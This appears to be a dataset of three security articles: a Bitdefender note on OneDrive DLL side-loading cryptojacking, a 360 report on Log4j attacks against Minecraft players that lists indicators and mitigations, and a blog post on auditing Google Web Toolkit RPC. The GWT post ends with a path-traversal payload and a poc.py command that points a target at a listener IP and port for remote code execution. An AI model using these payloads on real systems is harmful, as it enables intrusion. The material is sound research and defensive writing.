32193e11-1230-5df7-b32d-8a01c41825f4,05-October-2022,Side-Loading OneDrive for profit – Cryptojacking campaign detected in the wild,Cybercriminals are using a DLL hijacking vulnerability in Microsoft OneDrive to load cryptojackers. Bitdefender describes a cryptojacking campaign that exploits known DLL Side-Loading vulnerabilities in OneDrive. Users should ensure their OneDrive systems are up-to-date.,"Cryptojackers have become very lucrative for cybercriminals in recent years as the price of cryptocurrency soared. From data breaches to PUAs to warez downloads, coin miners and cryptojackers crop up steadily in our threat landscape reports . However, to meet their financial expectations, cybercriminals are taking new approaches to planting and loading cryptojackers on victims’ computers. This is the case of an active cryptojacking campaign that uses a Dynamic Library Link (DLL) hijacking vulnerability in OneDrive to achieve persistence and run undetected on infected devices. In this paper we describe a cryptojacking campaign in which the attackers exploit known DLL Side-Loading vulnerabilities in Microsoft OneDrive. Download the research paper Bitdefender recommends OneDrive users to ensure their security solution and operating systems are up-to-date; avoid cracked software and only download applications from trusted sources. Businesses should go further by tuning security solutions to monitor for DLL sideloading and applying IOCs to prevention and endpoint detection and response (EDR) solutions. An up-to-date and complete list of indicators of compromise is available to Bitdefender Advanced Threat Intelligence users. The currently known Indicators of Compromise can be found in the whitepaper below. Download the research paper"
a49d14e6-225e-5b46-a6b2-fc5bf61aaca7,14-December-2021,Urgent! Minecraft players are under massive attack,360 Security Center has detected a large number of attacks against Minecraft players. hackers are suspected of using the newly exposed log4j2 vulnerability to attack gamers. 360 says the vulnerability is a remote code execution vulnerability in Apache Log4j 2.,"Learn more about 360 Total Security Overview On the evening of December 9, 2021, the exploitation details of a remote code execution vulnerability in the open source project Apache Log4j 2 were made public. The incident quickly fermented and swept through most of the Internet. As Log4j is a common basic component of java logging and is widely used, the disaster area is also expanding rapidly. This weekend when major manufacturers are busy patching, 360 Security Center has also detected a large number of attacks against individual users, and Minecraft Java Edition is one of them. Attacks against gamers 360 Security Center has detected that hackers are suspected of using the newly exposed log4j2 vulnerability to attack Minecraft players. The attack first occurred on December 10th. The scale of the early attack was small. The number of attacked players detected on the first day was around 100. Starting at 12 o’clock on December 11, hackers launched a large-scale attack. From 12 o’clock to the present, nearly 5,000 Mincraft players were attacked every hour on average. At the peak of the attack, more than 10,000 players were attacked. Trends in the number of victimized players There are also demonstrations of exploiting this vulnerability on the Internet. Just sending a message with a vulnerability triggering instruction in the online chat of the game can launch an attack on the user who receives this message. The attack is very easy to launch. After the vulnerability is successfully exploited, the hacker triggers the remote code execution through the vulnerability, and then uses the local mshta to download and execute the remote hta file. Process chain of attacked machine The hta file is actually a remote control Trojan generated by the cactusTorch framework. With this Trojan, the attacker can completely control the current user’s computer. Part of the IOC of this attack hxxp://114.132.231.19/A.hta hxxp://114.132.231.19/O.hta hxxp://114.132.231.19/2.hta hxxp://114.132.231.19/OK1.hta hxxp://114.132.231.19/OK1.hta hxxp://114.132.231.19/hfs.exe cc.wdnmdnmsl.xyz Solution For Minecraft vulnerabilities, manufacturers also urgently released repaired versions and repair suggestions. The main contents are as follows: If you use the official version, upgrade to the latest version as soon as possible, and you can upgrade by restarting the game. For unofficial versions, pay attention to third-party upgrade information. Use the Java version server, upgrade the version to 1.18.1 Official detailed recommended address: https://www.minecraft.net/zh-hans/article/important-message–security-vulnerability-java-edition Regarding this attack, ordinary users should also harden their personal computers as soon as possible. 360 Security Center also gives the following security recommendations here: Temporary emergency plan Modify Log4j configuration: log4j2.formatMsgNoLookups=True Set the JVM startup parameters: -Dlog4j2.formatMsgNoLookups=true Set environment variables: FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS value is true 360 Security Center Protection Users who have installed the 360 Total Security, benefit from the powerful cloud intelligent recognition capabilities of 360 Security Center, and can recognize and intercept such attacks normally without upgrading. At the same time, 360 has also updated the high-risk vulnerability immunity tool. You can download the green version on the official website of 360.cn and run it directly, mitigating similar attacks through vulnerability immunity. At the same time, 360 has also updated the high-risk vulnerability immunity tool. You can download the green version on the official website of 360 Total Security and run it directly, mitigating similar attacks through vulnerability immunity. http://www.360totalsecurity.com/en/sysvulterminator/ Learn more about 360 Total Security"
14d5a1f1-920c-5995-8c5b-151c2d5211aa,27-April-2017,From Serialized to Shell :: Auditing Google Web Toolkit,A tool that will blindly fingerprint a non-obfuscated Google Web Toolkit cache file and generate basic GWT serialized strings. The tool can be used to generate a string fingerprinting tool for the GWT-RPC protocol.,"Recently I have been looking for vulnerabilities in a target that has some API’s developed with the Google Web Toolkit framework. This is the second time I’ve come up against a target using this technology so I figured it was about time I took some notes. Its sufficient to say, that I have finally upheld my word. This blog post is more of a reference to my future self, but if some people get something out of it, then more power to them! TL;DR; I developed a tool that will blindly fingerprint a non-obfuscated GWT cache file and generate basic GWT serialized strings, ready for auditing. You can read the Conclusion and get the code. Overview Past Research Examples of GWT-RPC requests Single parameter: String Single parameter: ArrayList Multiple parameters: ArrayList, String Multiple parameters: Integer, ArrayList Multiple parameters: Long, ArrayList (with multiple elements) Single parameter: Person (Java complex type) Tools Parsing Exploitation Conclusion Before we begin, lets take a quick look at some past research. Past Research Ron Gutierrez presented some research titled “Unlocking the Toolkit” and developed some tools that parse serialized GWT strings and discover functions from remote. Other’s such as Brian Slesinsky have developed a document detailing the GWT-RPC wire protocol and even has a google group dedicated to GWT users. Examples of GWT-RPC requests Let’s first see a few examples so that we can understand this protocol a little better. Single parameter: String Here is a request that that sends a single String as the value test . POST /helloworld/greet HTTP/1.1 Host: 127.0.0.1:8888 Content-Type: text/x-gwt-rpc; charset=utf-8 X-GWT-Permutation: D2C7F3E484D56542BBA3578DC8C1B447 X-GWT-Module-Base: http://127.0.0.1:8888/helloworld/ Content-Length: 224 Connection: close 7|0|6|http://127.0.0.1:8888/helloworld/|95F17E12D4B90695D035873A418208A8|com.example.test.client.GreetingService|greetServer|java.lang.String/2004016611|test|1|2|3|4|1|5|6| We can examine what is happening if we break down the serialized string by pipe | . 7 is the stream version. 0 is the flags. 6 is the number of strings in the serialized request http://127.0.0.1:8888/helloworld/ is the endpoint 95F17E12D4B90695D035873A418208A8 is the strong name. Not to be confused with a CSRF token. com.example.test.client.GreetingService is the endpoint client greetServer is the function name, implemented by the client/server java.lang.String/2004016611 is the first parameter denoting the type. test is the value of the first parameter. 1|2|3|4 is the first 4 elements of the string. 1 is the number of arguments to the function 5|6 is the parameter type and value (java.lang.String/2004016611 and test) Here is the corrosponding function implimentation: @RemoteServiceRelativePath ( ""greet"" ) public interface GreetingService extends RemoteService { String greetServer ( String param1 ) throws IllegalArgumentException ; } Single parameter: ArrayList Here is a request that that sends a single List of type ArrayList containing a String value test . POST /helloworld/greet HTTP/1.1 Host: 127.0.0.1:8888 Content-Type: text/x-gwt-rpc; charset=utf-8 X-GWT-Permutation: D2C7F3E484D56542BBA3578DC8C1B447 X-GWT-Module-Base: http://127.0.0.1:8888/helloworld/ Content-Length: 224 Connection: close 7|0|8|http://127.0.0.1:8888/helloworld/|0AA7A0C25ADF167CC648926141094922|com.example.test.client.GreetingService|greetServer|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test|1|2|3|4|1|5|6|1|7|8| Again, we can examine what is happening if we break down the serialized string. We will skip up to the function name, since we know what those values are already: 8 is the number of strings in the serialized request java.util.List is the first variable. Since it is a list, the next parameter specifies the type that is accepted. java.util.ArrayList/4159755760 is the List implimentation that is accepted by the client interface. java.lang.String/2004016611 is the type of ArrayList ( List<String> ) that is contained within the ArrayList test is the value of the first element of the ArrayList. 1|2|3|4 is the first 4 elements of the string. 1 is the number of arguments to the function 5|6 is the List and ArrayList implimentation (java.util.List and java.util.ArrayList/4159755760 values) 1 is the number of elements in the ArrayList 7|8 is the ArrayList type and its elements. Here is the corrosponding function implimentation: @RemoteServiceRelativePath ( ""greet"" ) public interface GreetingService extends RemoteService { String greetServer ( List < String > param1 ) throws IllegalArgumentException ; } Multiple parameters: ArrayList, String So, what if we send multiple parameters? Let’s use the following example: POST /helloworld/greet HTTP/1.1 Host: 127.0.0.1:8888 Content-Type: text/x-gwt-rpc; charset=utf-8 X-GWT-Permutation: D2C7F3E484D56542BBA3578DC8C1B447 X-GWT-Module-Base: http://127.0.0.1:8888/helloworld/ Content-Length: 224 Connection: close 7|0|9|http://127.0.0.1:8888/helloworld/|0AA7A0C25ADF167CC648926141094922|com.example.test.client.GreetingService|greetServer|java.util.List|java.lang.String/2004016611|java.util.ArrayList/4159755760|GWT User|wtf|1|2|3|4|2|5|6|7|1|6|8|9| This is the same example above, the only difference is that the addition of a string argument. 9 is the number of strings in the serialized request 2 is now the number of arguments to the function 9 is the extra String value @RemoteServiceRelativePath ( ""greet"" ) public interface GreetingService extends RemoteService { String greetServer ( List < String > param1 , String param2 ) throws IllegalArgumentException ; } Multiple parameters: Integer, ArrayList So, what if we send multiple parameters? Let’s use the following example: POST /helloworld/greet HTTP/1.1 Host: 127.0.0.1:8888 Content-Type: text/x-gwt-rpc; charset=utf-8 X-GWT-Permutation: 698BA15C24E28FA9B080002C35A1FA05 X-GWT-Module-Base: http://127.0.0.1:8888/helloworld/ Content-Length: 224 Connection: close 7|0|9|http://127.0.0.1:8888/helloworld/|43127AF533854D6F99980CB5572AEC0E|com.example.test.client.GreetingService|greetServer|java.lang.Integer/3438268394|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test|1|2|3|4|2|5|6|5|99|7|1|8|9| This is the same example above, the only difference is that an Integer type is used and it is now the first parameter. 9 is the number of strings in the serialized request 2 is now the number of arguments to the function 5|6 are the arguments to the function (java.lang.Integer/3438268394, java.util.List) 5 is the read in value of the Integer 99 is the Integer value. This can be tampered with. 7 is the ArrayList implimentation (the second parameter). 1 is the number of elements in the ArrayList. 8 is the ArrayList type ( ArrayList<String> , referencing java.lang.String/2004016611) 9 is the elements value (test) @RemoteServiceRelativePath ( ""greet"" ) public interface GreetingService extends RemoteService { String greetServer ( Integer param1 , List < String > name ) throws IllegalArgumentException ; } Multiple parameters: Long, ArrayList (with multiple elements) So, what if we send multiple elements in our ArrayList and throw in a Long for good measure? POST /helloworld/greet HTTP/1.1 Host: 127.0.0.1:8888 Content-Type: text/x-gwt-rpc; charset=utf-8 X-GWT-Permutation: 698BA15C24E28FA9B080002C35A1FA05 X-GWT-Module-Base: http://127.0.0.1:8888/helloworld/ Content-Length: 224 Connection: close 7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test1|test2|1|2|3|4|2|5|6|5|D4O|7|2|8|9|8|10| This is the same example above, the only difference is that an Long type is used there are now multiple elements in the ArrayList. 10 is the number of strings in the serialized request 2 there are 2 arguments to the function 5|6 are the arguments to the function (java.lang.Long/4227064769, java.util.List) 5 is the read in value of the Long D40 is the Long value. This can be tampered with, we will get to what this value is later. 7 is the ArrayList implimentation (the second parameter). 2 is the number of elements in the ArrayList. 8 is the ArrayList type ( ArrayList<String> , referencing java.lang.String/2004016611) 9 is the first element value (test1) 8 is the ArrayList type ( ArrayList<String> , referencing java.lang.String/2004016611) 10 is the second element value (test2) @RemoteServiceRelativePath ( ""greet"" ) public interface GreetingService extends RemoteService { String greetServer ( Long param1 , List < String > param2 ) throws IllegalArgumentException ; } So, what is the D40 Long value? It turns out that its an base64 RFC-4648 implimentation of the Long value. It can be decoded with a little python: #!/usr/local/bin/python import sys import math import string if len ( sys . argv ) < 2 : print ""%s <code>"" % sys . argv [ 0 ] sys . exit ( - 1 ) value = sys . argv [ 1 ] rfc4648 = list ( string . ascii_uppercase + string . ascii_lowercase + string . digits ) def decode ( code ): num = 0 i = len ( code ) - 1 for c in code : num += int ( rfc4648 . index ( c ) * math . pow ( 64 , i )) i -= 1 return int ( num ) print decode ( value ) saturn:~ mr_me$ ./poc.py D4O 15886 This means that 15886 was the long value sent to this function on the server-side. Single parameter: Person (Java complex type) Check out the excellent example here for learning how to serialize complex data types. Note that if you wish to send custom complex types to GWT endpoints, you will need to audit the source code of the target. Performing a white-box test is a requirement in that case so that you can determine the custom object’s properties. Tools The GWT-Penetration-Testing-Toolset was developed by Ron as part of his research. The tools work quite well. gwtparse This tool will take a serialized GWT string and attempt to parse it in order to find all the string locations in the rquest in order for us to test the server-side code for vulnerabilities. Nice is you already have a serialized string. saturn:gwtparse mr_me $ python gwtparse.py -b -p -i ""7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test1|test2|1|2|3|4|2|5|6|5|99|7|2|8|9|8|10|"" Serialized Object: 7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test1|test2|1|2|3|4|2|5|6|5|99|7|2|8|9|8|10| Stream Version: 7 Flags: 0 Column Numbers: 10 Host: http://127.0.0.1:8888/helloworld/ Hash: 5BA0C1B0BB61A2FFF68C4B4FAE5F9D16 Class Name: com.example.test.client.GreetingService Method: greetServer # of Params: 2 Parameters: { 'flag' : False, 'is_array' : False, 'is_custom_obj' : False, 'is_list' : False, 'typename' : 'java.lang.Long/4227064769' , 'values' : [ '99.07.0' ]} { 'flag' : False, 'is_array' : False, 'is_custom_obj' : True, 'is_list' : False, 'typename' : 'java.util.List' , 'values' : [ 'test1' , 'test2' ]} GWT RPC Payload Fuzz String 7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|§test1§|§test2§|1|2|3|4|2|5|6|5|§99§|§7§|2|8|9|8|10| The -b burp option is nice. Your serialized string contains the § characters so you can plug the request straight into the intruder and vulnerability scan away. gwtenum After having to make some changes to the code to support HTTPS, it turns out that gwtenum.py only works on a few endpoints. saturn:gwtenum mr_me $ saturn:gwtenum mr_me $ ./gwtenum.py -k ""JSESSIONID=D6D5B3A7ECE0FEF704F93249A7AD3AF6"" -u https://abc.xyz/some_gwt/some_gwt.nocache.js Analyzing https://abc.xyz/some_gwt/044D2FD1794AE52D7832F10410461CB4.cache.html =========================== Enumerated Methods =========================== saturn:gwtenum mr_me $ ./gwtenum.py -k ""JSESSIONID=D6D5B3A7ECE0FEF704F93249A7AD3AF6"" -u https://abc.xyz/some_other_gwt/some_other_gwt.nocache.js Analyzing https://abc.xyz/some_other_gwt/40A11A6CC6A8F2204BD8945E7647603B.cache.html =========================== Enumerated Methods =========================== GettingGraphItemService.createMonitorItemGettingBean ( ) GettingGraphItemService.createMonitorItemGettingBean ( J,java.util.List ) GettingGraphItemService.getGraphItem ( ) GettingMonitorInformationService.getAllMonitors ( ) GettingMonitorInformationService.getAvailMonitorItemCnt ( ) GettingMonitorInformationService.request ( xxx.ReqMessage/136736496 ) GettingOperatorGroupService.getCurrOperatorGroupId ( ) GettingOperatorGroupService.getCurrOperatorId ( ) GettingOperatorGroupService.getDevDscr ( java.lang.String/2004016611,java.util.List ) GettingOperatorGroupService.turnGroupData ( ) This is because the code assumes an obfuscated format of the cache files. Here are examples of a few functions within the some_other_gwt’s endpoint cache file. function XK ( b , c , d ){ return VK ( c , d , UK ( b , d ), TK ( b , d ), null )} function Ws ( b ){ return b >= 33 && b <= 40 || b == 27 || b == 13 || b == 9 } function MTc ( b ){ b . e = []; b . k = {}; b . i = false ; b . g = null ; b . j = 0 } function UB ( b ){ if ( b . e ){ b . d . Pe ( false ); b . b = null ; b . c = null }} function p_ ( b , c ){ Ix ( b . c ); c > 0 ? Jx ( b . c , c ): b . c . b . b . Ud ( null )} function U5 ( b , c ){ BH ( b . b , Cp ( c ), c ); GB ( b ,( JQ (), dQ ), new DN )} function sWc ( b ){ b . b = QXb ( dbc ,{ 93 : 1 , 109 : 1 , 111 : 1 }, 0 , 0 , 0 )} function QIb (){ this . d = RXb ( eac ,{ 93 : 1 , 111 : 1 }, - 1 ,[ 15 , 18 ])} function sT ( b ){ this . o = b ; this . b = 50 ; this . c = new AT ( this , b )} function Uqc ( b ){ this . b = new Irc ( this ); this . bd = b ; Jo ( this )} function ywc ( b ){ this . i = new Cu ( this ); this . j = b ; this . c = pvd } function Ewc ( b ){ this . i = new Cu ( this ); this . j = b ; this . c = pvd } When in reality, I was trying to parse the non-obfuscated some_gwt’s cache file. Here is an example of a function within this cache file: function $renameDir ( this $static , oldName , newName , callback ){ var $e0 , payload , statsContext , streamWriter ; statsContext = new RpcStatsContext_0 ; !! $stats && $stats ({ moduleName : $moduleName , sessionId : $sessionId , subSystem : ' rpc ' , evtGroup : statsContext . requestId , method : ' MIBFileService_Proxy.renameDir ' , millis :( new Date ). getTime (), type : ' begin ' }); streamWriter = $createStreamWriter ( this $static ); try { append ( streamWriter . encodeBuffer , '' + $addString ( streamWriter , ' xxx.MIBFileService ' )); append ( streamWriter . encodeBuffer , '' + $addString ( streamWriter , ' renameDir ' )); append ( streamWriter . encodeBuffer , ' 2 ' ); append ( streamWriter . encodeBuffer , '' + $addString ( streamWriter , ' java.lang.String/2004016611 ' )); append ( streamWriter . encodeBuffer , '' + $addString ( streamWriter , ' java.lang.String/2004016611 ' )); append ( streamWriter . encodeBuffer , '' + $addString ( streamWriter , oldName )); append ( streamWriter . encodeBuffer , '' + $addString ( streamWriter , newName )); payload = $toString_10 ( streamWriter ); !! $stats && $stats ({ moduleName : $moduleName , sessionId : $sessionId , subSystem : ' rpc ' , evtGroup : statsContext . requestId , method : ' MIBFileService_Proxy.renameDir ' , millis :( new Date ). getTime (), type : ' requestSerialized ' }); $doInvoke ( this $static , ( $clinit_781 () , INT ), ' MIBFileService_Proxy.renameDir ' , statsContext , payload , callback ); } catch ( $e0 ) { $e0 = caught_0 ( $e0 ); if ( ! instanceOf ( $e0 , 226 )) throw $e0 ; } } As you can see, the above JavaScript looks a little more strutured which will make it easier when we want to parse it. So I developed a parser that will also generate the GWT serialized string for these non-obfuscated cache files. Parsing saturn:~ mr_me $ ./gwt.py -c JSESSIONID:D6D5B3A7ECE0FEF704F93249A7AD3AF6 -u https://abc.xyz/some_other_gwt/some_other_gwt.nocache.js | GWT generator - mr_me 2017 | ( + ) parsing 9E618EE9F5D2949BDC9B848BAE0C6C2A.cache.html... saturn:~ mr_me $ ./gwt.py -c JSESSIONID:D6D5B3A7ECE0FEF704F93249A7AD3AF6 -u https://abc.xyz/some_gwt/some_gwt.nocache.js | GWT generator - mr_me 2017 | ( + ) parsing EA595041C3D0ECAA75FAA7D8AAF0DE5A.cache.html... ( 01 ) function : configSnmp ( 01 ) number of parameters: 0 ( 01 ) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingDeviceService|configSnmp|1|2|3|4|0| ( 02 ) function : createDeviceItemGettingBean ( 02 ) number of parameters: 0 ( 02 ) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingDeviceService|createDeviceItemGettingBean|1|2|3|4|0| ( 03 ) function : createSnmpConfigBean ( 03 ) number of parameters: 1 ( 03 ) parameters: device ( 03 ) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingDeviceService|createSnmpConfigBean|xx.DeviceItem/394618249|%s|1|2|3|4|1|5|6| ( 04 ) function : getDevice ( 04 ) number of parameters: 0 ( 04 ) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingDeviceService|getDevice|1|2|3|4|0| ( 05 ) function : getDevice ( 05 ) number of parameters: 1 ( 05 ) parameters: deviceID ( 05 ) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingDeviceService|getDevice|J|%s|1|2|3|4|1|5|6| ( 06 ) function : getCurrentOperatorId ( 06 ) number of parameters: 0 ( 06 ) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingUserTypeService|getCurrentOperatorId|1|2|3|4|0| ( 07 ) function : getMIBInfoByUserName ( 07 ) number of parameters: 1 ( 07 ) parameters: userID ( 07 ) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingUserTypeService|getMIBInfoByUserName|java.lang.String/2004016611|%s|1|2|3|4|1|5|6| ( 08 ) function : isReadOnlyUser ( 08 ) number of parameters: 0 ( 08 ) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingUserTypeService|isReadOnlyUser|1|2|3|4|0| ( 09 ) function : saveCurrentUserMIBInfo ( 09 ) number of parameters: 2 ( 09 ) parameters: userID, moduleList ( 09 ) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingUserTypeService|saveCurrentUserMIBInfo|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8| ( 10 ) function : deleteDir ( 10 ) number of parameters: 1 ( 10 ) parameters: dirName ( 10 ) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|deleteDir|java.lang.String/2004016611|%s|1|2|3|4|1|5|6| ( 11 ) function : deleteFile ( 11 ) number of parameters: 2 ( 11 ) parameters: dirName, fileName ( 11 ) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|deleteFile|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8| ( 12 ) function : exportQueryResult ( 12 ) number of parameters: 1 ( 12 ) parameters: queryResults ( 12 ) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|exportQueryResult|java.lang.String/2004016611|%s|1|2|3|4|1|5|6| ( 13 ) function : getCompilationResult ( 13 ) number of parameters: 0 ( 13 ) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|getCompilationResult|1|2|3|4|0| ( 14 ) function : getDefaultLoadedMIBModuleNames ( 14 ) number of parameters: 1 ( 14 ) parameters: maxFileNum ( 14 ) GWT: 6|0|5|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|getDefaultLoadedMIBModuleNames|java.lang.Integer/3438268394|1|2|3|4|1|5|5|%d| ( 15 ) function : getMibFileContent ( 15 ) number of parameters: 2 ( 15 ) parameters: dirName, fileName ( 15 ) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|getMibFileContent|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8| ( 16 ) function : getMibFileList ( 16 ) number of parameters: 0 ( 16 ) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|getMibFileList|1|2|3|4|0| ( 17 ) function : getMibFileNames ( 17 ) number of parameters: 0 ( 17 ) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|getMibFileNames|1|2|3|4|0| ( 18 ) function : loadMibModuleByName ( 18 ) number of parameters: 2 ( 18 ) parameters: dirName, moduleName ( 18 ) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|loadMibModuleByName|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8| ( 19 ) function : newDir ( 19 ) number of parameters: 1 ( 19 ) parameters: dirName ( 19 ) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|newDir|java.lang.String/2004016611|%s|1|2|3|4|1|5|6| ( 20 ) function : renameDir ( 20 ) number of parameters: 2 ( 20 ) parameters: oldName, newName ( 20 ) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|renameDir|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8| ( 21 ) function : requestMIBNodes ( 21 ) number of parameters: 1 ( 21 ) parameters: mibNodeOID ( 21 ) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|requestMIBNodes|java.lang.String/2004016611|%s|1|2|3|4|1|5|6| ( 22 ) function : sendBeanName ( 22 ) number of parameters: 1 ( 22 ) parameters: beanName ( 22 ) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MibWidgetService|sendBeanName|java.lang.String/2004016611|%s|1|2|3|4|1|5|6| ( 23 ) function : setMibNodesInfo ( 23 ) number of parameters: 1 ( 23 ) parameters: mibNodesList ( 23 ) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MibWidgetService|setMibNodesInfo|java.util.List|java.util.ArrayList|java.lang.String|%s|1|2|3|4|1|5|6|7|8| ( 24 ) function : get ( 24 ) number of parameters: 2 ( 24 ) parameters: device, nodeOIDs ( 24 ) GWT: 6|0|10|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.SNMPService|get|xx.DeviceItem/394618249|java.util.List|java.util.ArrayList|java.lang.String|%s|%s|1|2|3|4|2|5|6|7|8|9|10| ( 25 ) function : getNext ( 25 ) number of parameters: 2 ( 25 ) parameters: device, nodeOIDs ( 25 ) GWT: 6|0|10|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.SNMPService|getNext|xx.DeviceItem/394618249|java.util.List|java.util.ArrayList|java.lang.String|%s|%s|1|2|3|4|2|5|6|7|8|9|10| ( 26 ) function : record ( 26 ) number of parameters: 4 ( 26 ) parameters: device, beginOid, endOid, fileName ( 26 ) GWT: 6|0|12|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.SNMPService|record|xx.DeviceItem/394618249|java.lang.String/2004016611|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|%s|%s|1|2|3|4|4|5|6|7|8|9|10|11|12| ( 27 ) function : set ( 27 ) number of parameters: 4 ( 27 ) parameters: device, oidsToSet, valueToSet, syntax ( 27 ) GWT: 6|0|18|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.SNMPService|set|xx.DeviceItem/394618249|java.util.List|java.util.ArrayList|java.lang.String|java.util.List|java.util.ArrayList|java.lang.String|java.util.List|java.util.ArrayList|java.lang.String|%s|%s|%s|%s|1|2|3|4|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18| Quite mode also works: saturn:~ $ ./gwt.py -q -c JSESSIONID:D6D5B3A7ECE0FEF704F93249A7AD3AF6 -u https://abc.xyz/some_gwt/some_gwt.nocache.js | GWT generator - mr_me 2017 | ( + ) parsing 80F7BC053CE9C312BE6BA81EEEEB70FC.cache.html... ( 01 ) function : configSnmp ( 02 ) function : createDeviceItemGettingBean ( 03 ) function : createSnmpConfigBean ( 04 ) function : getDevice ( 05 ) function : getDevice ( 06 ) function : getCurrentOperatorId ( 07 ) function : getMIBInfoByUserName ( 08 ) function : isReadOnlyUser ( 09 ) function : saveCurrentUserMIBInfo ( 10 ) function : deleteDir ( 11 ) function : deleteFile ( 12 ) function : exportQueryResult ( 13 ) function : getCompilationResult ( 14 ) function : getDefaultLoadedMIBModuleNames ( 15 ) function : getMibFileContent ( 16 ) function : getMibFileList ( 17 ) function : getMibFileNames ( 18 ) function : loadMibModuleByName ( 19 ) function : newDir ( 20 ) function : renameDir ( 21 ) function : requestMIBNodes ( 22 ) function : sendBeanName ( 23 ) function : setMibNodesInfo ( 24 ) function : get ( 25 ) function : getNext ( 26 ) function : record ( 27 ) function : set So we can see that gwt.py will not parse cache files that are obfuscated, you will have to use gwtenum.py for that. Exploitation Several functions were vulnerable to different types of attacks but one of the interesting functions I came across, was the renameDir function. This function either wasn’t implemented in the actual UI of the target or at the very least I couldn’t find it. This is not an issue because as long at the client MIBFileService class impliments it, we can reach it. We can use gwt.py to generate the GWT serialized string for us. ( 20 ) function : renameDir ( 20 ) number of parameters: 2 ( 20 ) parameters: oldName, newName ( 20 ) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|renameDir|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8| The code tells us the parameters, oldName and newName so my natural instict is to try and attack the endpoint using traversals. I didn’t even bother looking at the server-side code for this function. 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|renameDir|java.lang.String|java.lang.String|../../../../../from_some_folder|../../to_some_other_folder|1|2|3|4|2|5|6|7|8| After bypassing the authentication using other vulnerabilities, it turns out, I can leverage this to achieve remote code execution against my target. saturn:~ mr_me$ ./poc.py 172.16.175.148 172.16.175.1:4444 Some Target Remote Code Execution Zero Day 